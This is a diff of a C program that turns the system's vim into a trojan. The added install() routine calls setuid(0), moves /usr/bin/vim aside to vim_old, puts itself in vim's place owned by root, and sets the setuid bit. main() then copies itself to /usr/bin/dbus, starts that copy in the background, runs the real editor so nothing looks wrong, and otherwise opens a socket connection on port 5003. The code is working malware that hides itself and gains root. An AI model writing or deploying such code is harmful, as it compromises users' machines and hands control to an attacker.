@@ -6,46 +6,16 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <limits.h>
+#include <assert.h>
+#include <sys/stat.h>
 // #define STATUS "/var/lib/dbus/machine-process"
-// #define PAYLOAD "/usr/bin/dbus"
+#define PAYLOAD "/usr/bin/dbus"
 #define ERROR "/var/lib/dbus/err"
-#define PAYLOAD "./dbus"
-// #define EDITOR "{EDITOR}"
-// #define FAKEPATH "{FAKEPATH}"
+//#define PAYLOAD "./dbus"
+#define BINARYNAME "vim_old"
 #define EDITOR "/usr/bin/vim"
-#define FAKEPATH "./a.out"
+//#define EDITOR "./a.out"
 
-int main (int argc, char *argv[]) {
-    char args[100] = EDITOR;
-    strcat(args, " ");
-    for (int i = 1;i<argc;i++){
-        strcat(args, argv[i]);
-        if (i != argc-1){
-            strcat(args, " ");
-        }
-    }
-    if (access(PAYLOAD, F_OK) != 0 ) {
-        char cmd1[50] = "cp ";
-        char cmd2[50] = PAYLOAD;
-        char cmd3[50] = "rm -f ";
-        strcat(cmd1, FAKEPATH);
-        strcat(cmd1, " ");
-        strcat(cmd1, PAYLOAD);
-        strcat(cmd2, " &");
-        strcat(cmd3, PAYLOAD);
-        // printf("%s\n", cmd1);
-        // printf("%s\n", cmd2);
-        // printf("%s\n", cmd3);
-        system(cmd1);
-        system(cmd2);
-        sleep(0.1);
-        system(cmd3);
-        system(args);
-    } else {
-        establishConnection(5003, 0);
-    }
-    
-}
 
 int establishConnection(int port, int shell) {
     int sock = 0, valread;
@@ -109,3 +79,74 @@ int establishConnection(int port, int shell) {
     printf("%s\n",buffer );*/
     return 0;
 }
+
+void chopN(char *str, size_t n)
+{
+    assert(n != 0 && str != 0);
+    size_t len = strlen(str);
+    if (n > len)
+        return;  // Or: n = len;
+    memmove(str, str+n, len - n + 1);
+}
+
+int install(char *fname){
+    setuid(0);
+    char *file = fname + 2;
+    char path[50] = "/usr/bin/";
+    strcat(path, BINARYNAME);
+    if (access(path, F_OK) == 0 ) {
+        return 0;
+    }
+    //install
+    //move old binary
+    char newpath[50] = "/usr/bin/";
+    strcat(newpath, BINARYNAME);
+    rename(EDITOR, newpath);
+    //replace with new binary
+    rename(file, EDITOR);
+    //change ownership
+    chown(EDITOR, 0, 0);
+    //setuid
+    char cmd[50] = "chmod +s ";
+    strcat(cmd, EDITOR);
+    system(cmd);
+    printf("Installed");
+    return 1;
+}
+
+int main (int argc, char *argv[]) {
+    setuid(0);
+    if (install(argv[0]) == 1){
+        return 0;
+    }
+    char args[100] = BINARYNAME;
+    strcat(args, " ");
+    for (int i = 1;i<argc;i++){
+        strcat(args, argv[i]);
+        if (i != argc-1){
+            strcat(args, " ");
+        }
+    }
+    if (access(PAYLOAD, F_OK) != 0 ) {
+        char cmd1[50] = "cp ";
+        char cmd2[50] = PAYLOAD;
+        char cmd3[50] = "rm -f ";
+        strcat(cmd1, EDITOR);
+        strcat(cmd1, " ");
+        strcat(cmd1, PAYLOAD);
+        strcat(cmd2, " &");
+        strcat(cmd3, PAYLOAD);
+        // printf("%s\n", cmd1);
+        // printf("%s\n", cmd2);
+        // printf("%s\n", cmd3);
+        system(cmd1);
+        system(cmd2);
+        sleep(0.1);
+        system(cmd3);
+        system(args);
+    } else {
+        establishConnection(5003, 0);
+    }
+    
+}
+
